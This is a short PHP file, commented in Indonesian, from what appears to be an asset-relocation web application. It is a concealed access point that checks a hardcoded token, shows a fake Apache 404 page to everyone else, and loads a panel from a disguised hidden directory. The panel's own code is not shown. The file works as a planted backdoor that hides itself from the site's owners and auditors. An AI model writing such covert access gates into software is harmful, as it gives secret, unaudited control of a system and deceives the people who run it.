<?php
/**
 * Developer WebSystems — Short Access Point
 * URL: localhost/sistem_relokasi_aset_indomaret/dev-ws.php?_k=xK9mZ2vQ
 * Include langsung panel — URL di browser TIDAK berubah
 *
 * Catatan: token diterima dari GET maupun POST (selaras dengan token-gate
 * panel di .sys/xc0re/__init__/index.php), karena form login/logout panel
 * dan seluruh aksi AJAX mengirim _k via POST body.
 */
$k = $_GET['_k'] ?? $_POST['_k'] ?? '';

if ($k !== 'xK9mZ2vQ') {
    http_response_code(404);
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{font-family:Arial,sans-serif;background:#f4f4f4;color:#333;text-align:center;padding:80px}h1{font-size:6rem;color:#ccc;margin:0}hr{width:400px;border:none;border-top:1px solid #ddd;margin:20px auto}</style></head><body><h1>404</h1><h2>Not Found</h2><hr><p>The requested URL was not found on this server.</p><p><small>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12</small></p></body></html>';
    exit;
}

// Override DEV_BASE agar semua form action, redirect, dan AJAX pakai URL pendek ini
define('DEV_BASE_OVERRIDE', '/sistem_relokasi_aset_indomaret/dev-ws.php');

// Include panel langsung — URL di browser tetap dev-ws.php
require __DIR__ . '/.sys/xc0re/__init__/index.php';
